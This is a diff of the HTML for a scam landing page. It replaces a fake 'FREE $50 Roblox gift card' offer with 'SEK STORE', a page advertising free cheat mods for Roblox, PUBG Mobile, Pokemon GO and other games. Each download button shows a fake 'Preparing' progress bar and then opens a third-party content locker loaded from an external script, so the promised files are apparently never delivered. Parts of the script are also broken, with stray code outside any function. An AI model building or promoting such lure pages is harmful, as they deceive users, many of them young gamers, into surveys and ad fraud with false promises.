@@ -1,215 +1,764 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>FREE $50 Roblox Gift Card — Instant Access</title>
-  <meta name="description" content="Claim your FREE $50 Roblox gift card. Limited offer worldwide. Fast 2-minute verification. Instant delivery. No hidden fees." />
-  <meta name="keywords" content="free roblox gift card, $50 roblox code, roblox rewards, roblox offer, instant roblox credit, claim roblox gift card" />
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  
+  <meta name="description" content="SEK STORE - Discover the best premium MOD APKs for Android & iOS. Unlock unlimited UC in PUBG Mobile, enhanced Baseball 9 mods, Geometry Dash hacks, and more! Fast, safe, and 100% free to download.">
 
-  <!-- Content Locker Code -->
-  <script type="text/javascript">
-    var aGakq_YjO_UpeTRc={"it":4517457,"key":"74e57"};
-  </script>
-  <script src="https://duw03nk63ml3f.cloudfront.net/c450783.js"></script>
-  <script>setTimeout(_qd, 5000);</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>SEK STORE - Premium MOD APKs</title>
+  <link rel="icon" href="https://i.postimg.cc/tJ423WL2/temp-Imagewzt-Cxv.avif" />
+  <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;700;900&display=swap" rel="stylesheet" />
   <style>
     :root {
-      --bg1: #020617;
-      --bg2: #08122a;
-      --accent: #ff3b81;
-      --accent2: #7c3aed;
-      --muted: #9fb2cc;
+      --bg-color: #ffffff;
+      --text-color: #000000;
+      --card-bg: #f0f0f0;
+      --btn-bg: #00b894;
+      --btn-text: #ffffff;
+      --highlight: #26c6da;
     }
-    * { box-sizing: border-box; }
-    html, body {
+    body.dark {
+      --bg-color: #111;
+      --text-color: #ffffff;
+      --card-bg: #1f1f1f;
+      --btn-bg: #00b894;
+      --btn-text: #ffffff;
+    }
+    body {
+      font-family: 'Exo 2', sans-serif;
+      background: linear-gradient(-45deg, #23a6d5, #23d5ab, #d53a23, #f7b733);
+      background-size: 400% 400%;
+      animation: gradientBG 20s ease infinite;
+      color: var(--text-color);
       margin: 0;
       padding: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(180deg, var(--bg1), var(--bg2));
-      color: #eaf3ff;
+      min-height: 100vh;
       overflow-x: hidden;
     }
-
-    header {
-      position: sticky;
-      top: 0;
-      background: rgba(2,6,23,0.6);
-      backdrop-filter: blur(6px);
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 14px 20px;
-      z-index: 100;
+    @keyframes gradientBG {
+      0% {background-position:0% 50%}
+      50% {background-position:100% 50%}
+      100% {background-position:0% 50%}
     }
-    .logo {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-weight: bold;
+    .desktop-warning {
+      display: none;
     }
-    .logo i {
-      background: linear-gradient(135deg, var(--accent), var(--accent2));
-      padding: 10px;
-      border-radius: 10px;
-      color: white;
+    @media (min-width: 768px) {
+      body {
+        background: #f0f4f8;
+        color: #222;
+        overflow: hidden;
+      }
+      .mobile-only {
+        display: none;
+      }
+      .desktop-warning {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background: #e3f2fd;
+        color: #222;
+        font-size: 24px;
+        font-weight: 700;
+        text-align: center;
+        padding: 20px;
+        position: relative;
+      }
+      .desktop-warning h1 {
+        margin-bottom: 20px;
+        font-size: 3rem;
+        color: var(--highlight);
+        animation: pulse 3s infinite;
+      }
+      .qr-container {
+        position: relative;
+        width: 180px;
+        height: 180px;
+        margin: 0 auto 15px;
+        animation: bounceQR 3s ease-in-out infinite;
+      }
+      @keyframes pulse {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0.6; }
+      }
+      @keyframes bounceQR {
+        0%, 100% { transform: translateY(0); }
+        50% { transform: translateY(-20px); }
+      }
+      .qr-code {
+        width: 100%;
+        height: 100%;
+        border-radius: 16px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        cursor: pointer;
+        transition: transform 0.3s ease;
+      }
+      .qr-code:hover {
+        transform: scale(1.1) rotate(5deg);
+        box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+      }
+      .copy-link-btn {
+        display: inline-block;
+        background: var(--btn-bg);
+        color: var(--btn-text);
+        padding: 12px 20px;
+        border: none;
+        border-radius: 30px;
+        font-weight: 700;
+        cursor: pointer;
+        font-size: 18px;
+        user-select: none;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        transition: background 0.3s ease, transform 0.2s ease;
+      }
+      .copy-link-btn:hover {
+        background: #019874;
+        transform: scale(1.05);
+      }
+      .copy-container {
+        text-align: center;
+      }
     }
-    .cta-btn {
-      background: linear-gradient(90deg, var(--accent), var(--accent2));
-      color: white;
-      padding: 12px 18px;
-      border-radius: 10px;
-      font-weight: bold;
-      text-decoration: none;
-      box-shadow: 0 8px 30px rgba(124,58,237,0.2);
-      transition: transform 0.2s ease;
-    }
-    .cta-btn:hover {
-      animation: shake 0.3s;
-    }
-
-    .hero {
-      text-align: center;
-      padding: 60px 20px;
-      position: relative;
-    }
-    .hero h1 {
-      font-size: 2.2rem;
-      margin-bottom: 10px;
-    }
-    .hero p {
-      color: var(--muted);
-      max-width: 600px;
-      margin: 0 auto 30px;
-    }
-
-    .gift-card {
-      width: 320px;
-      max-width: 90vw;
+    /* Mobile styles */
+    .mobile-only {
+      padding: 12px;
+      max-width: 480px;
       margin: 0 auto;
-      border-radius: 16px;
-      overflow: hidden;
-      box-shadow: 0 20px 60px rgba(2,8,23,0.7);
-      border: 1px solid rgba(255,255,255,0.05);
-      cursor: pointer;
     }
-    .gift-card img {
-      width: 100%;
-      display: block;
+    header {
+      background-color: var(--card-bg);
+      padding: 20px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 900;
+      letter-spacing: 1px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+      border-radius: 10px;
+      margin-top: 12px;
+      color: var(--text-color);
     }
-
-    .countdown {
-      font-size: 1.2rem;
-      margin: 20px 0;
-      color: #ff6ea8;
-      font-weight: bold;
+    .section-title {
+      text-align: center;
+      font-size: 20px;
+      font-weight: 700;
+      margin: 24px 0 16px;
+      color: var(--text-color);
+      text-transform: uppercase;
+      letter-spacing: 1.2px;
     }
-
-    .steps {
+    .app-list {
       display: flex;
       flex-direction: column;
-      gap: 12px;
-      max-width: 600px;
-      margin: 30px auto;
-      background: rgba(255,255,255,0.02);
-      padding: 20px;
-      border-radius: 12px;
-      border: 1px solid rgba(255,255,255,0.05);
+      gap: 16px;
+      padding: 0 10px 40px;
     }
-    .steps div {
+    .app-list .app-card {
       display: flex;
       align-items: center;
-      gap: 10px;
+      background: var(--card-bg);
+      border-radius: 12px;
+      padding: 14px 16px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      cursor: default;
+      transition: box-shadow 0.3s ease;
     }
-    .steps i {
-      color: var(--accent);
+    .app-list .app-card:hover {
+      box-shadow: 0 6px 20px rgba(0,0,0,0.18);
     }
-
-    .floating-cta {
+    .app-list .app-card img {
+      width: 72px;
+      height: 72px;
+      margin-right: 16px;
+      border-radius: 12px;
+      object-fit: cover;
+    }
+    .app-list .info {
+      flex: 1;
+    }
+    .download-btn {
+      background-color: var(--btn-bg);
+      color: var(--btn-text);
+      padding: 8px 18px;
+      border: none;
+      border-radius: 30px;
+      font-weight: 700;
+      font-size: 14px;
+      cursor: pointer;
+      user-select: none;
+      transition: background-color 0.3s ease;
+      min-width: 110px;
+    }
+    .download-btn:hover {
+      background-color: #019874;
+    }
+    /* Modal */
+    .modal {
+      display: none;
       position: fixed;
-      bottom: 20px;
-      right: 20px;
-      background: linear-gradient(90deg, var(--accent), var(--accent2));
-      color: white;
-      padding: 14px 20px;
-      border-radius: 50px;
-      font-weight: bold;
-      text-decoration: none;
-      box-shadow: 0 10px 30px rgba(124,58,237,0.3);
-      z-index: 200;
-      animation: pulse 1.5s infinite;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0,0,0,0.65);
+      justify-content: center;
+      align-items: center;
+      z-index: 10000;
+      animation: fadeIn 0.3s ease forwards;
+      overflow: hidden;
     }
-
-    @keyframes pulse {
-      0% { box-shadow: 0 0 0 0 rgba(255,59,129,0.4); }
-      70% { box-shadow: 0 0 0 20px rgba(255,59,129,0); }
-      100% { box-shadow: 0 0 0 0 rgba(255,59,129,0); }
+    @keyframes fadeIn {
+      from {opacity: 0;}
+      to {opacity: 1;}
     }
-
-    @keyframes shake {
-      0% { transform: translate(0px, 0px); }
-      25% { transform: translate(2px, 0px); }
-      50% { transform: translate(-2px, 0px); }
-      75% { transform: translate(2px, 0px); }
-      100% { transform: translate(0px, 0px); }
-    }
-
-    footer {
+    .modal-content {
+      background: var(--card-bg);
+      padding: 24px 28px;
+      border-radius: 16px;
+      width: 90%;
+      max-width: 360px;
       text-align: center;
-      padding: 20px;
-      font-size: 13px;
-      color: var(--muted);
+      box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+      user-select: none;
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
     }
+    .modal-content p {
+      font-size: 18px;
+      font-weight: 700;
+      margin: 0 0 10px 0;
+      color: var(--text-color);
+    }
+    .screenshots-container {
+      display: flex;
+      overflow-x: auto;
+      gap: 12px;
+      padding-bottom: 8px;
+      scrollbar-width: thin;
+      scrollbar-color: var(--btn-bg) transparent;
+    }
+    .screenshots-container::-webkit-scrollbar {
+      height: 6px;
+    }
+    .screenshots-container::-webkit-scrollbar-thumb {
+      background-color: var(--btn-bg);
+      border-radius: 3px;
+    }
+    .screenshots-container img {
+      flex-shrink: 0;
+      width: 100px;
+      height: 180px;
+      border-radius: 12px;
+      object-fit: cover;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+      cursor: pointer;
+      transition: transform 0.3s ease;
+    }
+    .screenshots-container img:hover {
+      transform: scale(1.05);
+      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+    }
+    .unlock-btn, .cancel-btn {
+      width: 100%;
+      padding: 14px 0;
+      border-radius: 40px;
+      font-weight: 700;
+      border: none;
+      cursor: pointer;
+      font-size: 16px;
+      user-select: none;
+      margin-bottom: 12px;
+      transition: background-color 0.3s ease;
+    }
+    .unlock-btn {
+      background-color: var(--btn-bg);
+      color: var(--btn-text);
+    }
+    .unlock-btn:hover {
+      background-color: #019874;
+    }
+    .cancel-btn {
+      background-color: #ccc;
+      color: #222;
+    }
+    .cancel-btn:hover {
+      background-color: #999;
+      color: #eee;
+    }
+    .ios-btn {
+  background-color: #007bff;
+}
+.ios-btn:hover {
+  background-color: #0056b3;
+}
+
+.btn-group {
+  display: flex;
+  flex-direction: row;
+  flex-wrap: wrap;
+  gap: 8px;
+  margin-top: 8px;
+}
+
+.download-btn {
+  flex: 1;
+  min-width: 120px;
+  text-align: center;
+}
+
+.android-btn {
+  background-color: #00b894;
+}
+
+.android-btn:hover {
+  background-color: #019874;
+}
+
+.ios-btn {
+  background-color: #007bff;
+}
+
+.ios-btn:hover {
+  background-color: #0056b3;
+}
+.app-card {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 12px;
+  flex-wrap: wrap;
+}
+
+.app-card .info {
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+  min-width: 140px;
+}
+
+.btn-group {
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+
+.download-btn {
+  padding: 6px 12px;
+  font-size: 14px;
+  font-weight: 700;
+  border-radius: 8px;
+  border: none;
+  cursor: pointer;
+  white-space: nowrap;
+}
+
+.android-btn {
+  background-color: #00b894;
+  color: #fff;
+}
+
+.android-btn:hover {
+  background-color: #019874;
+}
+
+.ios-btn {
+  background-color: #007bff;
+  color: #fff;
+}
+
+.ios-btn:hover {
+  background-color: #0056b3;
+}
+.app-card.active {
+  transform: scale(1.07);
+  box-shadow: 0 0 14px #00c3ff, 0 0 28px #00c3ff, 0 0 42px #00c3ff;
+  transition: transform 0.25s ease, box-shadow 0.25s ease;
+  border: 1px solid #00c3ff;
+}
+
+/* Overlay base */
+#loadingOverlay {
+  position: fixed;
+  inset: 0;
+  z-index: 9999;
+}
+
+/* Background animated gradient */
+.animated-bg {
+  background: linear-gradient(-45deg, #23a6d5, #23d5ab, #d53a23, #f7b733);
+  background-size: 400% 400%;
+  animation: gradientBG 12s ease infinite;
+  width: 100%;
+  height: 100%;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+/* Same gradient animation you use in body */
+@keyframes gradientBG {
+  0% {background-position:0% 50%}
+  50% {background-position:100% 50%}
+  100% {background-position:0% 50%}
+}
+
+.loader-box {
+  background: #fff;
+  border-radius: 20px;
+  padding: 30px 20px;
+  width: 90%;
+  max-width: 320px;
+  text-align: center;
+  box-shadow: 0 6px 24px rgba(0, 0, 0, 0.2);
+}
+
+.loader-icon {
+  font-size: 48px;
+  animation: spin 1.5s linear infinite;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+.loader-text-top {
+  color: #888;
+  font-size: 14px;
+  letter-spacing: 1px;
+  margin-top: 8px;
+}
+
+.loader-text-main {
+  font-weight: bold;
+  font-size: 20px;
+  color: #2c3e50;
+  margin: 8px 0 14px;
+}
+
+.loader-bar {
+  width: 100%;
+  height: 8px;
+  background: #ddd;
+  border-radius: 5px;
+  overflow: hidden;
+}
+
+.loader-fill {
+  height: 100%;
+  width: 0;
+  background: #5ecc29;
+  animation: fillBar 3s ease-out forwards;
+}
+
+@keyframes fillBar {
+  0% { width: 0; }
+  100% { width: 100%; }
+}
+
   </style>
+
+  <!-- Locker PUBG -->
+
+<script type="text/javascript">
+  var iOHjC_sWF_jGHiHc = {"it":4517457,"key":"74e57"};
+</script>
+<script src="https://dlk457skl57zp.cloudfront.net/7d093e6.js" async></script>
+
+
 </head>
 <body>
-
-  <header>
-    <div class="logo"><i class="fas fa-gift"></i> Roblox Rewards</div>
-    <a href="https://smrturl.co/gift-card~738227F" class="cta-btn">🎯 Get My $50 Code</a>
-  </header>
-
-  <section class="hero">
-    <h1>🎁 FREE $50 Roblox Gift Card — Available Worldwide</h1>
-    <p>Roblox fans around the world are claiming their $50 gift cards today. No hidden fees. Just complete a quick 2-minute verification and get your code instantly. Limited supply — act fast!</p>
-
-    <a href="https://smrturl.co/gift-card~738227F" class="gift-card">
-      <img src="https://images.rbxcdn.com/bf6f7bdab9fd8b460a8e1b53f8834aa4" alt="Roblox Gift Card">
-    </a>
-
-    <div style="margin-top:20px;">
-      <a href="https://smrturl.co/gift-card~738227F" class="cta-btn">🔥 Unlock Your Roblox Gift</a>
+  <!-- Desktop Warning Section -->
+  <div class="desktop-warning" role="alert" aria-live="polite">
+    <h1>This site is for iOS and Android phones only.</h1>
+    <div class="qr-container" tabindex="0" aria-label="QR code to open SEK STORE on your phone">
+      <img class="qr-code" src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=https://www.sekmarketing.site" alt="QR code linking to SEK STORE mobile site" />
     </div>
-
-    <div class="countdown">⏳ Hurry! This exclusive offer expires in <span id="timer">13:37:40</span></div>
-
-    <div class="steps">
-      <div><i class="fas fa-mouse-pointer"></i> Click the button below</div>
-      <div><i class="fas fa-clipboard-check"></i> Complete a short 2-minute verification</div>
-      <div><i class="fas fa-gift"></i> Instantly receive your $50 Roblox code</div>
+    <div class="copy-container">
+      <button class="copy-link-btn" onclick="copyLink()" aria-label="Copy SEK STORE link to clipboard">Copy SEK STORE Link</button>
     </div>
+  </div>
 
-    <div style="text-align:center; margin-top:20px;">
-      <a href="https://smrturl.co/gift-card~738227F" class="cta-btn">✅ Start Now & Claim Your Code</a>
-    </div>
-  </section>
+  <!-- Mobile Content -->
+  <div class="mobile-only" role="main">
+    
+    <button id="themeToggleBtn" class="theme-toggle" onclick="toggleTheme()"> DARK MODE🌙</button>
 
-  <a href="https://smrturl.co/gift-card~738227F" class="floating-cta">
-    🎁 Get $50 Roblox Gift
-  </a>
+    <header id="main-title">SEK STORE - Premium MOD APKs</header>
 
-  <footer>
-    © 2025 Roblox Gift Cards — Limited Offer • <a href="#" style="color:inherit;text-decoration:underline">Privacy</a>
-  </footer>
+    <input type="search" id="searchBox" aria-label="Search apps" placeholder="Search apps..." oninput="filterApps()" style="width:100%;padding:10px 14px; margin: 20px 0; border-radius: 10px; border: 1px solid #ccc; font-size: 16px;" />
+
+    <div class="section-title" id="all-apps-label">ALL APPS</div>
+    <div class="app-list" id="appList" role="list" aria-live="polite" aria-relevant="additions removals">
+
+
+          <!-- roblox -->
+          <div class="app-card" data-title="roblox MOD APK" data-desc="[Unlimited Robux/Mod Menu/Wall Hack/etc.] for Android">
+            <img loading="lazy" src="https://i.postimg.cc/zvMDPdq8/temp-Imageq01hq-P.avif" alt="roblox MOD APK - Unlimited Robux / Mod Menufor Android and iOS" width="72" height="72" />
+            <div class="info" style="flex: 2;">
+              <div class="title"> Blox Fruits Script Hub </div>
+              <div class="desc"> New Update Redz Hub .. Script Auto Golden fish + Aimbot skill</div>
+            </div>
+            <div class="btn-group" style="flex: 2;">
+              <button class="download-btn android-btn" onclick="showLoadingThenLocker()">Android</button>
+              <button class="download-btn ios-btn" onclick="showLoadingThenLocker()">iOS</button>
+            </div>
+          </div>
+      <!-- PUBG -->
+      <div class="app-card" data-title="PUBG Mobile MOD APK" data-desc="Unlimited UC - 2025 Version">
+        <img loading="lazy" src="https://i.postimg.cc/g012yDnJ/temp-Image-Qt-ASHh.avif" alt="PUBG Mobile MOD APK - Unlimited UC for Android and iOS" width="72" height="72" />
+        <div class="info" style="flex: 2;">
+          <div class="title">PUBG Mobile MOD APK</div>
+          <div class="desc">Unlimited UC - 2025 Version</div>
+        </div>
+        <div class="btn-group" style="flex: 2;">
+          <button class="download-btn android-btn" onclick="showLoadingThenLocker()">Android</button>
+          <button class="download-btn ios-btn" onclick="showLoadingThenLocker()">iOS</button>
+        </div>
+      </div>
+    
+      <!-- Baseball 9 -->
+      <div class="app-card" data-title="BASEBALL 9 MOD APK" data-desc="Enhanced MOD Version">
+        <img loading="lazy" src="https://img.utdstc.com/icon/7e9/b0c/7e9b0c4a6769f08221695e4842cb0f3569501b45e725f582138465a78c3f6bda:200" alt="BASEBALL 9 MOD APK - Enhanced MOD Version" width="72" height="72" />
+        <div class="info" style="flex: 2;">
+          <div class="title">BASEBALL 9 MOD APK</div>
+          <div class="desc">Enhanced MOD Version</div>
+        </div>
+        <div class="btn-group" style="flex: 2;">
+          <button class="download-btn android-btn" onclick="showLoadingThenLocker()">Android</button>
+          <button class="download-btn ios-btn" onclick="showLoadingThenLocker()">iOS</button>
+        </div>
+      </div>
+    
+      <!-- Geometry Dash -->
+      <div class="app-card" data-title="Geometry Dash Lite MOD APK" data-desc="Unlimited Money, open levels">
+        <img loading="lazy" src="https://modyolo.com/wp-content/uploads/2021/10/geometry-dash-apk-mod.png" alt="Geometry Dash Lite MOD APK - Unlocked Levels and Unlimited Money" width="72" height="72" />
+        <div class="info" style="flex: 2;">
+          <div class="title">Geometry Dash Lite MOD APK</div>
+          <div class="desc">Unlimited Money , open levels</div>
+        </div>
+        <div class="btn-group" style="flex: 2;">
+          <button class="download-btn android-btn" onclick="showLoadingThenLocker()">Android</button>
+          <button class="download-btn ios-btn" onclick="showLoadingThenLocker()">iOS</button>
+        </div>
+      </div>
+    
+      <!-- Pokemon GO Spoofer -->
+      <div class="app-card" data-title="Pokemon Go Spoofer" data-desc="Install the ultimate Pokemon GO Spoofer — teleport, joystick, auto-walk & more. Play smarter!">
+        <img loading="lazy" src="https://itweaked.net/assets/img/app_images/17tlkJR4d419016b529ae1fc2251d04eedb09d4.png" alt="Pokemon Go Spoofer - Teleport, Joystick, Auto-walk for iOS and Android" width="72" height="72" />
+        <div class="info" style="flex: 2;">
+          <div class="title">Pokemon Go Spoofer</div>
+          <div class="desc">Install the ultimate Pokemon GO Spoofer — teleport, joystick, auto-walk & more. Play smarter!</div>
+        </div>
+        <div class="btn-group" style="flex: 2;">
+          <button class="download-btn android-btn" onclick="showLoadingThenLocker()">Android</button>
+          <button class="download-btn ios-btn" onclick="showLoadingThenLocker()">iOS</button>
+        </div>
+      </div>
+    
+      <!-- 8 Ball Pool Mod -->
+      <div class="app-card" data-title="8 Ball Pool Mod" data-desc="8 Ball Pool MOD – Long Guidelines, Anti-Ban, No Root/JB. Fast install on iOS & Android">
+        <img loading="lazy" src="https://appskin.net/img/8%20Ball%20Pool.jpg" alt="8 Ball Pool MOD APK - Long Guidelines and Anti-Ban for Android and iOS" width="72" height="72" />
+        <div class="info" style="flex: 2;">
+          <div class="title">8 Ball Pool Mod</div>
+          <div class="desc">8 Ball Pool MOD – Long Guidelines, Anti-Ban, No Root/JB. Fast install on iOS & Android</div>
+        </div>
+        <div class="btn-group" style="flex: 2;">
+          <button class="download-btn android-btn" onclick="showLoadingThenLocker()">Android</button>
+          <button class="download-btn ios-btn" onclick="showLoadingThenLocker()">iOS</button>
+        </div>
+      </div>
+    
+   
+    </div> 
+    
 
   <script>
-    // Countdown timer (13h 37m 40s = 49060 seconds)
-    let time = 49060;
-    const timerEl = document.getElementById('timer');
-    setInterval(() => {
-      if (time > 0) {
-        time--;
-        const hrs = String(Math.floor(time / 3600)).padStart
+    // Theme toggle
+    function toggleTheme() {
+      document.body.classList.toggle('dark');
+    }
 
-        <button onclick="setTimeout(_qd, 5000);">Click me!</button>
+    // Copy SEK STORE link on desktop
+    function copyLink() {
+      const link = 'https://www.sekmarketing.site';
+      navigator.clipboard.writeText(link).then(() => {
+        alert('Link copied to clipboard!');
+      }, () => {
+        alert('Failed to copy link.');
+      });
+    }
+
+    // Search/filter apps
+    function filterApps() {
+      const query = document.getElementById('searchBox').value.toLowerCase().trim();
+      const apps = document.querySelectorAll('#appList .app-card');
+      apps.forEach(app => {
+        const title = (app.getAttribute('data-title') || '').toLowerCase();
+        const desc = (app.getAttribute('data-desc') || '').toLowerCase();
+        if (title.includes(query) || desc.includes(query)) {
+          app.style.display = 'flex';
+        } else {
+          app.style.display = 'none';
+        }
+      });
+    }
+
+    // Modal control
+    const modal = document.getElementById('downloadModal');
+    const unlockBtn = document.getElementById('unlockBtn');
+    const screenshotsContainer = document.getElementById('screenshotsContainer');
+    let currentApp = null;
+
+    // Screenshots data per app key (can be filled if you want)
+    const screenshots = {
+  geometry: [],
+  baseball: [],
+  pubg: [],
+  pokemon: [],
+  ball: [],
+  roblox: []
+};
+
+
+    function showModal(appKey) {
+      currentApp = appKey;
+      // Clear previous screenshots
+      screenshotsContainer.innerHTML = '';
+      // Add new screenshots images if any
+      if (screenshots[appKey]) {
+        screenshots[appKey].forEach(src => {
+          const img = document.createElement('img');
+          img.src = src;
+          img.alt = `${appKey} screenshot`;
+          screenshotsContainer.appendChild(img);
+        });
+      }
+      modal.style.display = 'flex';
+
+      // Assign correct unlock function based on appKey
+      unlockBtn.textContent = 'Unlock & Download';
+      unlockBtn.onclick = () => unlockApp(appKey);
+    }
+
+    function hideModal() {
+      modal.style.display = 'none';
+      currentApp = null;
+      screenshotsContainer.innerHTML = '';
+    }
+
+   
+
+  if (appKey === 'pubg') {
+    _KE();
+    waitForLockerCompletion(() => {
+      window.open(downloadLinks.pubg, '_blank');
+    });
+  } else if (appKey === 'baseball') {
+    _KE();
+    waitForLockerCompletion(() => {
+      window.open(downloadLinks.baseball, '_blank');
+    });
+  } else if (appKey === 'geometry') {
+    _KE();
+    waitForLockerCompletion(() => {
+      window.open(downloadLinks.geometry, '_blank');
+    });
+  } else if (appKey === 'pokemon') {
+    _KE();
+    waitForLockerCompletion(() => {
+      window.open(downloadLinks.pokemon, '_blank');
+    });
+  } else if (appKey === 'ball') {
+    _KE();
+    waitForLockerCompletion(() => {
+      window.open(downloadLinks.ball, '_blank');
+    });
+  } else if (appKey === 'roblox') {
+    _KE();
+    waitForLockerCompletion(() => {
+      window.open(downloadLinks.ball, '_blank');
+    });
+  }
+
+
+
+    function waitForLockerCompletion(callback) {
+      setTimeout(callback, 100); 
+    }
+
+    // Responsive design: Show desktop warning only on desktop
+    function checkDevice() {
+      if (window.innerWidth >= 768) {
+        document.body.classList.add('desktop');
+        document.body.classList.remove('dark');
+        document.querySelector('.desktop-warning').style.display = 'flex';
+        document.querySelector('.mobile-only').style.display = 'none';
+      } else {
+        document.body.classList.remove('desktop');
+        document.querySelector('.desktop-warning').style.display = 'none';
+        document.querySelector('.mobile-only').style.display = 'block';
+      }
+    }
+    window.addEventListener('resize', checkDevice);
+    window.addEventListener('load', checkDevice);
+  </script>
+  <script>
+    function toggleTheme() {
+      const body = document.body;
+      const btn = document.getElementById("themeToggleBtn");
+  
+      body.classList.toggle('dark');
+  
+      if (body.classList.contains('dark')) {
+        btn.textContent = '☀️'; 
+      } else {
+        btn.textContent = 'Dark Mode🌙'; 
+      }
+    }
+  
+    window.addEventListener('DOMContentLoaded', () => {
+      const btn = document.getElementById("themeToggleBtn");
+      if (document.body.classList.contains('dark')) {
+        btn.textContent = '☀️';
+      } else {
+        btn.textContent = 'Dark Mode';
+      }
+    });
+  </script>
+  <script>
+
+    document.querySelectorAll('.app-card').forEach(card => {
+      card.addEventListener('click', function() {
+     
+        document.querySelectorAll('.app-card').forEach(c => c.classList.remove('active'));
+        
+        this.classList.add('active');
+      });
+    });
+  </script>
+    <div id="loadingOverlay" style="display: none;">
+      <div class="loader-backdrop animated-bg">
+        <div class="loader-box">
+          <div class="loader-icon">⚙️</div>
+          <div class="loader-text-top">PROCESSING...</div>
+          <div class="loader-text-main">Preparing</div>
+          <div class="loader-bar">
+            <div class="loader-fill"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+    <script>
+      function showLoadingThenLocker() {
+        const overlay = document.getElementById('loadingOverlay');
+        overlay.style.display = 'block';
+    
+        setTimeout(() => {
+          _KE(); // Call your locker
+          overlay.style.display = 'none';
+        }, 3000);
+      }
+    </script>
